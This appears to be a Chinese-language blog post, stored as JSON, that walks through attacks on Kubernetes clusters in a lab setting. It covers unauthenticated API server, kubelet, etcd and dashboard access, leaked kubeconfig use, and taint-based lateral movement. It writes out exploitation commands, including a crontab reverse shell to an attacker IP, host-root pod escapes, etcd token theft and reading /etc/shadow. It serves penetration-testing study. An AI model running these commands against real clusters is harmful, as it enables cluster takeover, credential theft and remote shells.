{"title":"云攻防-K8S安全","uid":"aa2cc9f18c0295fd4c228dc62555a6a1","slug":"云攻防-K8S安全","date":"2025-05-17T08:38:05.197Z","updated":"2025-05-17T09:17:36.613Z","comments":true,"path":"api/articles/云攻防-K8S安全.json","keywords":null,"cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/6f0ed8a7-9402-4c93-84ed-727d54681967.jpg","content":"<h1 id=\"云攻防-K8S安全\"><a href=\"#云攻防-K8S安全\" class=\"headerlink\" title=\"云攻防-K8S安全\"></a>云攻防-K8S安全</h1><p>Kubernetes 是一个开源的，用于编排云平台中多个主机上的容器化的应用，目标是让<br>部署容器化的应用能简单并且高效的使用，提供了应用部署，规划，更新，维护的一种机<br>制。其核心的特点就是能够自主的管理容器来保证云平台中的容器按照用户的期望状态运<br>行着，管理员可以加载一个微型服务，让规划器来找到合适的位置，同时，Kubernetes<br>在系统提升工具以及人性化方面，让用户能够方便的部署自己的应用。</p>\n<p>参考：</p>\n<p><a href=\"https://blog.csdn.net/qq_34101364/article/details/122506768\">https://blog.csdn.net/qq_34101364/article/details/122506768</a></p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-2.png\"></p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image.png\"></p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-1.png\"></p>\n<h2 id=\"K8S-集群攻击点\"><a href=\"#K8S-集群攻击点\" class=\"headerlink\" title=\"K8S 集群攻击点\"></a>K8S 集群攻击点</h2><p>随着越来越多企业开始上云的步伐，在攻防演练中常常碰到云相关的场景，例：公有云、</p>\n<p>私有云、混合云、虚拟化集群等。以往渗透路径「外网突破 -&gt; 提权 -&gt; 权限维持 -&gt; 信息收</p>\n<p>集 -&gt; 横向移动 -&gt; 循环收集信息」，直到获得重要目标系统。但随着业务上云以及虚拟化技</p>\n<p>术的引入改变了这种格局，也打开了新的入侵路径，例如：</p>\n<ul>\n<li><p>1、通过虚拟机攻击云管理平台，利用管理平台控制所有机器</p>\n</li>\n<li><p>2、通过容器进行逃逸，从而控制宿主机以及横向渗透到 K8s Master 节点控制所有容器</p>\n</li>\n<li><p>3、利用 KVM-QEMU &#x2F; 执行逃逸获取宿主机，进入物理网络横向移动控制云平台</p>\n</li>\n</ul>\n<p>目前互联网上针对云原生场景下的攻击手法零零散散的较多，仅有一些厂商发布过相关矩</p>\n<p>阵技术，但没有过多的细节展示，本文基于微软发布的 Kubernetes 威胁矩阵进行扩展，介绍相关的具体攻击方法。</p>\n<p>参考：</p>\n<p><a href=\"https://mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw\">https://mp.weixin.qq.com/s/yQoqozJgP8F-ad24xgzIPw</a></p>\n<p><a href=\"https://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ\">https://mp.weixin.qq.com/s/QEuQa0KVwykrMzOPdgEHMQ</a></p>\n<p>cat &#x2F;proc&#x2F;1&#x2F;cgroup &#x2F;&#x2F; 查看是否存在 K8S</p>\n<h2 id=\"一，api-未授权访问\"><a href=\"#一，api-未授权访问\" class=\"headerlink\" title=\"一，api 未授权访问\"></a>一，api 未授权访问</h2><h3 id=\"1，-攻击-8080-端口\"><a href=\"#1，-攻击-8080-端口\" class=\"headerlink\" title=\"1， 攻击 8080 端口\"></a>1， 攻击 8080 端口</h3><p>API Server 未授权访问旧版本的 k8s 的 API Server 默认会开启两个端口：8080 和 6443。6443 是安全端口，安全端口使用 TLS 加密；但是 8080 端口无需认证，仅用于测试。6443 端口需要认证，且有 TLS 保护。(k8s&lt;1.16.0) 新版本 k8s 默认已经不开启 8080。需要更改相应的配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /etc/kubernetes/manifests/</span><br><span class=\"line\">--insecure-port=8080</span><br><span class=\"line\">--insecure-bind-address=0.0.0.0</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl.exe -s 192.168.139.130:8080 get nodes</span><br><span class=\"line\">kubectl.exe -s 192.168.139.130:8080 get pods</span><br><span class=\"line\">//连接后创建test.yaml文件</span><br><span class=\"line\">kubectl -s 192.168.139.130:8080 create -f test.yaml</span><br><span class=\"line\">//同过api server 创建test.yaml文件来创建一个新的pod</span><br><span class=\"line\">kubectl -s 192.168.139.130:8080--namespace=default exec -it test </span><br><span class=\"line\">bash </span><br><span class=\"line\">echo -e &quot;***** root bash -i &gt;&amp; /dev/tcp/192.168.139.128/4444 0&gt;&amp;1\\n&quot; &gt;&gt; /mnt/etc/crontab</span><br><span class=\"line\">//写入定时任务，执行反弹shell</span><br></pre></td></tr></table></figure>\n<p>test.yaml 中的内容</p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-5.png\"></p>\n<h3 id=\"2、攻击-6443-端口\"><a href=\"#2、攻击-6443-端口\" class=\"headerlink\" title=\"2、攻击 6443 端口\"></a>2、攻击 6443 端口</h3><p>API Server 未授权访问一些集群由于鉴权配置不当，将”system:anonymous” 用户绑定到”cluster-admin” 用户组，从而使 6443 端口允许匿名用户以管理员权限向集群内部下发指令。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl create clusterrolebinding system:anonymous</span><br><span class=\"line\">--clusterrole=cluster-admin            --user=system:anonymous</span><br></pre></td></tr></table></figure>\n<p>攻击时访问 6443 端口，存在此情况那么可以尝试攻击</p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-2025-05-12-205753.png\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-创建恶意 pods</span><br><span class=\"line\">https://192.168.139.130:6443/api/v1/namespaces/default/pods/</span><br><span class=\"line\">//构建数据包POST</span><br><span class=\"line\">&#123;&quot;apiVersion&quot; : &quot;v1&quot; ,&quot;kind&quot; : &quot;Pod&quot; , &quot;metadata&quot;: &#123;&quot;annotations&quot; : &#123;&quot;kubect.kubernetes.io/last-applied-configuration&quot; :&quot;&#123;\\&quot;apiVersion\\&quot;:\\&quot;v1\\,\\&quot;kind\\&quot; : \\&quot;Pod\\&quot; ,\\&quot;metadata\\&quot;: &#123;\\&quot;annotations\\&quot;: &#123;&#125; ,\\&quot;name\\&quot;:\\&quot;tes02\\&quot; ,\\&quot;namespace\\&quot;:\\&quot;default\\&quot;&#125;,\\&quot;spec\\&quot;: &#123;\\&quot;containers\\&quot; :[&#123;\\&quot;image\\&quot; : \\&quot;nginx:1.14.2\\&quot;,\\&quot;name\\&quot;:\\&quot;test02\\&quot;,\\&quot;volumeMounts\\&quot; :[&#123;\\&quot;mountPath\\&quot;:\\&quot;/host\\&quot;,\\&quot;name\\&quot;:\\&quot;host\\&quot;&#125;]&#125;],\\&quot;volumes\\&quot;:[&#123;\\&quot;hostPath\\&quot;:&#123;\\&quot;path\\&quot; :\\&quot;/\\&quot; ,\\&quot;type\\&quot;:\\&quot;Directory\\&quot;&#125; ,\\&quot;name\\&quot;:\\&quot;host\\&quot; &#125;]&#125; &#125;\\n&quot;&#125;&quot;name&quot; : &quot;test02&quot; ,&quot;namespace&quot; :&quot;default&quot;&#125;,&quot;spec&quot; : &#123;&quot;containers&quot; :[&#123;&quot;image&quot;:&quot;nginx:1.14.2&quot;,&quot;name&quot;:&quot;test02&quot;,&quot;volumeMounts&quot; :[&#123;&quot;mountPath&quot;:&quot;/host&quot; ,&quot;name&quot; :&quot;host&quot; &#125; ]&#125;],&quot;volumes&quot; : [ &#123;&quot;hostPath&quot; : &#123;&quot;path&quot; :&quot;/&quot; ,&quot;type&quot;&quot;Directory&quot;&#125;,&quot;name&quot;:&quot;host&quot;&#125;]&#125; &#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-连接判断pods</span><br><span class=\"line\">kubectl --insecure-skip-tls-verify -s https://192.168.139.130:6443 get pods</span><br><span class=\"line\">-连接执行pods</span><br><span class=\"line\">kubectl --insecure-skip-tls-verify -s https://192.168.139.130:6443 --namespace=default exec -it test02 bash</span><br></pre></td></tr></table></figure>\n<p>操作与上面一样，写入反弹 shell</p>\n<h3 id=\"3，攻击-10250-端口：kubelet-未授权访问\"><a href=\"#3，攻击-10250-端口：kubelet-未授权访问\" class=\"headerlink\" title=\"3，攻击 10250 端口：kubelet 未授权访问\"></a>3，攻击 10250 端口：kubelet 未授权访问</h3><p>与 API Server 类似，Kubelet 也运行着 API 服务，默认服务端口为 10250 和 10248</p>\n<p>Kubelet 存在的风险主要也是未授权访问，如果 Kubelet 存在未授权访问，就可以控制所在节点的权限。</p>\n<p>条件：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/var/lib/kubelet/config.yaml</span><br><span class=\"line\">修改 authentication的anonyous为true  </span><br><span class=\"line\">将authorization mode 修改为 AlwaysAllow</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-6.png\"><br>访问页面时，存在此数据代表存在漏洞<br><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-7-1024x432.png\"><br>利用执行命令，需要利用三个参数：</p>\n<p>namespace，pod，container</p>\n<p>访问 <a href=\"https://192.168.139.132:10250/runningpods\">https://192.168.139.132:10250/runningpods</a></p>\n<p>使用谷歌 FeHelper 插件可以将 json 数据更加直观的看到</p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-8.png\"><br>执行模板：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -X POST -k &quot;https://192.168.139.132:10250/run/&lt;namespace&gt;/&lt;pod&gt;/&lt;container&gt;&quot; -d &quot;cmd=id&quot;</span><br></pre></td></tr></table></figure>\n<p>构造触发：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://192.168.139.132:10250/run/default/test02/test02</span><br><span class=\"line\">curl -X POST -k &quot;https://192.168.139.132:10250/run/default/test02/test02&quot; -d &quot;cmd=id&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"二，etcd-未授权访问（利用条件苛刻）\"><a href=\"#二，etcd-未授权访问（利用条件苛刻）\" class=\"headerlink\" title=\"二，etcd 未授权访问（利用条件苛刻）\"></a>二，etcd 未授权访问（利用条件苛刻）</h2><p>默认通过证书认证，主要存放节点的数据，如一些 token 和证书。</p>\n<p><strong>第一种</strong>：没有配置指定–client-cert-auth 参数打开证书校验，暴露在外 etcd 服务存在未授权访问风险。</p>\n<ul>\n<li>暴露外部可以访问，直接未授权访问获取 secrets 和 token 利用</li>\n</ul>\n<p><strong>第二种</strong>: 在打开证书校验选项后，通过本地 127.0.0.1:2379 可免认证访问 Etcd 服务，但通过其他地址访问要携带 cert 进行认证访问，一般配合 ssrf 或其他利用，较为鸡肋。</p>\n<ul>\n<li>只能本地访问，直接未授权访问获取 secrets 和 token 利用</li>\n</ul>\n<p><strong>第三种</strong>: 实战中在安装 k8s 默认的配置 2379 只会监听本地，如果访问没设置 0.0.0.0 暴露，那么也就意味着最多就是本地访问，不能公网访问，只能配合 ssrf 或其他。</p>\n<ul>\n<li>只能本地访问，利用 ssrf 或其他进行获取 secrets 和 token 利用</li>\n</ul>\n<p>复现利用:<br>暴露 etcd 未授权 -&gt; 获取 secrets&amp;token-&gt; 通过 token 访问 API-Server 接管</p>\n<p>SSRF 解决限制访问 -&gt; 获取 secrets&amp;token-&gt; 通过 token 访问 API-Server 接管</p>\n<p>V2&#x2F;v3 版本利用参考:<a href=\"https://www.cnblogs.com/qtzd/p/k8s\">https://www.cnblogs.com/qtzd/p/k8s</a> etcd.html</p>\n<p>启动:kubectl createf recommended.yaml</p>\n<p>V2 版本利用:</p>\n<p>直接访间 <a href=\"http://ip:2379/v2/keys/?recursive=true%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%89%80%E6%9C%89%E7%9A%84\">http://ip:2379/v2/keys/?recursive=true，可以看到所有的</a> key-value 值。(secrets token)</p>\n<p>V3 版本利用：</p>\n<p>1、连接提交测试</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./etcdctl --endpoints=192.168.139.136:23791 get / --prefix</span><br><span class=\"line\">./etcdctl --endpoints=192.168.139.136:23791 put /testdir/testkey1&quot;Hello world1&quot;</span><br><span class=\"line\">./etcdctl --endpoints=192.168139.136:23791 put /testdir/testkey2&quot;Hello world2&quot;</span><br><span class=\"line\">./etcdctl --endpoints=192.168.139.136:23791 put /testdir/testkey3&quot;Hello world3&quot;</span><br></pre></td></tr></table></figure>\n<p>2、获取 k8s 的 secrets:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./etcdctl --endpoints=192.168.139.136:23791 get / --prefix--keys-only | grep /secrets/</span><br></pre></td></tr></table></figure>\n<p>3、读取 service account token:.</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./etcdctl --endpoints=192.168.139.136:23791 get /--prefix --keys-only | grep /secrets/kube-system/clusterrole</span><br><span class=\"line\">./etcdctl--endpoints-192.168.139.136:23791 get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-jdp5z</span><br></pre></td></tr></table></figure>\n<p>4、通过 token 访问 API-Server，获取集群的权限:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl --insecure-skip-tls-verify-s https://127.0.0.1:6443/ -token=&quot;ey...&quot; -n kube-system get pods</span><br></pre></td></tr></table></figure>\n<h2 id=\"三，Dashboard-未授权访问\"><a href=\"#三，Dashboard-未授权访问\" class=\"headerlink\" title=\"三，Dashboard 未授权访问\"></a>三，Dashboard 未授权访问</h2><p>默认端口：8001<br>配置不当导致 dashboard 未授权访问，通过 dashboard 我们可以控制整个集群。kubernetes dashboard 的未授权其实分两种情况:<br>一种是在本身就存在着不需要登录的 http 接口，但接口本身并不会暴露出来，如接口被暴露在外，就会导致 dashboard 未授权。另外一种情况则是开发嫌登录麻烦，修改了配置文件，使得安全接口 https 的 dashboard 页面可以跳过登录。</p>\n<p><strong>漏洞复现：</strong></p>\n<p>用户开启 enable-skip-login 时可以在登录界面点击跳过登录进 dashboard*</p>\n<p>Kubernetes-dashboard 绋定 cluster-admin (拥有管理集群的最高权限)</p>\n<p>启动:kubectl createf recommended.yaml<br><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-9.png\"></p>\n<p>进入页面后，登录旁都 Skip, 可跳过登录直接进入</p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-10-1024x254.png\"></p>\n<p>后逃逸方法与上面类似</p>\n<h2 id=\"五，Configfile-鉴权文件泄漏\"><a href=\"#五，Configfile-鉴权文件泄漏\" class=\"headerlink\" title=\"五，Configfile 鉴权文件泄漏\"></a>五，Configfile 鉴权文件泄漏</h2><p>攻击者通过 webshell、Github 等拿到了 K8s 配置的 Config 文件，操作集群，从而接管所有容器。K8s configfile 作为 K8s 集群的管理凭证，其中包含有关 K8s 集群的详细信息 (API Server、登录凭证)。如果攻击者能够访问到此文件 (如办公网员工机器入侵、泄露到 Github 的代码等)，就可以直接通过 API Server 接管 K8s 集群，带来风险隐患。用户凭证保存在 kubeconfig 文件中，通过以下顺序来找到 kubeconfig 文件:</p>\n<ul>\n<li><p>1，如果提供了–kubeconfig 参数，就使用提供的 kubeconfig</p>\n</li>\n<li><p>2，文件如果没有提供–kubeconfig 参数，但设置了环境变量 SKUBECONFIG，则使用该环境变量提供的 kubeconfig 文件</p>\n</li>\n<li><p>3，如果以上两种情况都没有，kubectl 就使用默认的 kubeconfig 文件<br>~&#x2F;.kube&#x2F;config</p>\n</li>\n</ul>\n<p>1，使用 config 文件连接:<br>kubectl -s <a href=\"https://192.168.139.130:6443/\">https://192.168.139.130:6443/</a> –kubeconfig&#x3D;config –insecure-skip-tls-verify&#x3D;true get nodes</p>\n<p>2、上传利用 test.yaml 创建 pod</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl apply -f test.yaml -n default--kubeconfig=config</span><br></pre></td></tr></table></figure>\n<p>3，连接 pod 后进行容器挂载逃逸</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl exec -it test bash -n default--kubeconfig=config</span><br><span class=\"line\">cd/mnt</span><br><span class=\"line\">chroot . bash</span><br></pre></td></tr></table></figure>\n<h2 id=\"六，Kubectl-Proxy-不安全配置\"><a href=\"#六，Kubectl-Proxy-不安全配置\" class=\"headerlink\" title=\"六，Kubectl Proxy 不安全配置\"></a>六，Kubectl Proxy 不安全配置</h2><p>当运维人员需要某个环境暴露端口或者 IP 时，会用到 Kubectl Proxy，使用 kubectl proxy 命令就可以使 API server 监听在本地的 xxxx 端口上</p>\n<p>环境搭建:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl--insecure-skip-tls-verify proxy-accept-hosts=^.*$ --address=0.0.0.0 --port=8009</span><br><span class=\"line\">//暴露8009端口</span><br></pre></td></tr></table></figure>\n<h2 id=\"七，K8S-的污点横向移动\"><a href=\"#七，K8S-的污点横向移动\" class=\"headerlink\" title=\"七，K8S 的污点横向移动\"></a>七，K8S 的污点横向移动</h2><p>在 K8S 中，利用污点（Taint）进行横向移动渗透是指攻击者通过操纵或绕过集群中的污点和容忍（Toleration）机制，将恶意负载（Pod）调度到原本受保护的节点上，从而突破隔离并进一步渗透集群。污点和容忍是 K8S 的合法功能，设计目的是增强安全性。问题通常源于错误的权限分配（如过宽的 RBAC 策略）或不安全的容忍配置（如 Pod 容忍所有污点）。</p>\n<p>设置污点:</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">设置污点：</span><br><span class=\"line\">kubectl taint nodes nodel xtz=valuel:NoSchedule</span><br></pre></td></tr></table></figure>\n<p>通过以下命令查看节点上的污点设置：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl describe node &lt;节点名称&gt;</span><br><span class=\"line\">Taints中 NoSchodule-为没有污点，none也没有污点</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/image-11-1024x475.png\"><br>查看是否存在污点：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl describe node | grep &#x27;Taints&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><strong>容忍（Toleration）</strong></p>\n<p>容忍是 Pod 上设置的属性，允许 Pod 被调度到带有特定污点的节点。</p>\n<p>创建带有容忍参数的 Pod (必要时可以修改 Yaml 使 Pod 增加到特定的 Node 上去)</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">通过<span class=\"built_in\">cat</span>写入1.yaml配置文件</span></span><br><span class=\"line\">cat &gt; 1.yaml &lt;&lt; EOF</span><br><span class=\"line\">apiVersion: v1</span><br><span class=\"line\">kind: Pod</span><br><span class=\"line\">metadata:</span><br><span class=\"line\">  name: control-master-15</span><br><span class=\"line\">spec:</span><br><span class=\"line\">  tolerations:</span><br><span class=\"line\">    - key: node-role.kubernetes.io/master  //使Pod增加到特定的Node上去</span><br><span class=\"line\">      operator: Exists</span><br><span class=\"line\">      effect: NoSchedule</span><br><span class=\"line\">  containers:</span><br><span class=\"line\">    - name: control-master-15</span><br><span class=\"line\">      image: ubuntu:18.04</span><br><span class=\"line\">      command: [&quot;/bin/sleep&quot;, &quot;3650d&quot;]</span><br><span class=\"line\">      volumeMounts:</span><br><span class=\"line\">      - name: master</span><br><span class=\"line\">        mountPath: /master</span><br><span class=\"line\">  volumes:</span><br><span class=\"line\">  - name: master</span><br><span class=\"line\">    hostPath:</span><br><span class=\"line\">      path: /</span><br><span class=\"line\">      type: Directory</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">创建Pod</span></span><br><span class=\"line\">kubectl create -f control-master.yaml</span><br><span class=\"line\"><span class=\"meta prompt_\"> </span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">部署情况</span></span><br><span class=\"line\">kubectl get deploy -o wide</span><br><span class=\"line\"><span class=\"meta prompt_\"> </span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">Pod详情</span></span><br><span class=\"line\">kubectl get pod -o wide</span><br></pre></td></tr></table></figure>\n<p>获得 Master 控制端</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kubectl exec control-master-15 -it bash</span><br><span class=\"line\">chroot /master bash</span><br><span class=\"line\">ls -al</span><br><span class=\"line\">cat /etc/shadow</span><br></pre></td></tr></table></figure>","feature":true,"text":"云攻防-K8S安全Kubernetes 是一个开源的，用于编排云平台中多个主机上的容器化的应用，目标是让部署容器化的应用能简单并且高效的使用，提供了应用部署，规...","permalink":"/post/云攻防-K8S安全","photos":[],"count_time":{"symbolsCount":"8.6k","symbolsTime":"8 mins."},"categories":[{"name":"云安全","slug":"云安全","count":3,"path":"api/categories/云安全.json"}],"tags":[{"name":"云安全","slug":"云安全","count":3,"path":"api/tags/云安全.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E4%BA%91%E6%94%BB%E9%98%B2-K8S%E5%AE%89%E5%85%A8\"><span class=\"toc-text\">云攻防-K8S安全</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#K8S-%E9%9B%86%E7%BE%A4%E6%94%BB%E5%87%BB%E7%82%B9\"><span class=\"toc-text\">K8S 集群攻击点</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%EF%BC%8Capi-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\"><span class=\"toc-text\">一，api 未授权访问</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%EF%BC%8C-%E6%94%BB%E5%87%BB-8080-%E7%AB%AF%E5%8F%A3\"><span class=\"toc-text\">1， 攻击 8080 端口</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E6%94%BB%E5%87%BB-6443-%E7%AB%AF%E5%8F%A3\"><span class=\"toc-text\">2、攻击 6443 端口</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%EF%BC%8C%E6%94%BB%E5%87%BB-10250-%E7%AB%AF%E5%8F%A3%EF%BC%9Akubelet-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\"><span class=\"toc-text\">3，攻击 10250 端口：kubelet 未授权访问</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%8C%EF%BC%8Cetcd-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%EF%BC%88%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6%E8%8B%9B%E5%88%BB%EF%BC%89\"><span class=\"toc-text\">二，etcd 未授权访问（利用条件苛刻）</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%89%EF%BC%8CDashboard-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE\"><span class=\"toc-text\">三，Dashboard 未授权访问</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BA%94%EF%BC%8CConfigfile-%E9%89%B4%E6%9D%83%E6%96%87%E4%BB%B6%E6%B3%84%E6%BC%8F\"><span class=\"toc-text\">五，Configfile 鉴权文件泄漏</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%85%AD%EF%BC%8CKubectl-Proxy-%E4%B8%8D%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE\"><span class=\"toc-text\">六，Kubectl Proxy 不安全配置</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%83%EF%BC%8CK8S-%E7%9A%84%E6%B1%A1%E7%82%B9%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8\"><span class=\"toc-text\">七，K8S 的污点横向移动</span></a></li></ol></li></ol>","author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{},"next_post":{"title":"云原生-docker","uid":"c1542731ca718f81298fabe69ac4f53f","slug":"云攻防-云原生-docker","date":"2025-05-17T08:28:23.756Z","updated":"2025-05-17T08:37:23.312Z","comments":true,"path":"api/articles/云攻防-云原生-docker.json","keywords":null,"cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/e6d0930a-5ea5-4a58-9282-8a97feff4efa.jpg","text":"云原生-docker拿到权限：判断是否为容器 https://blog.csdn.net/qq_23936389/article/details/1314866...","permalink":"/post/云攻防-云原生-docker","photos":[],"count_time":{"symbolsCount":"4k","symbolsTime":"4 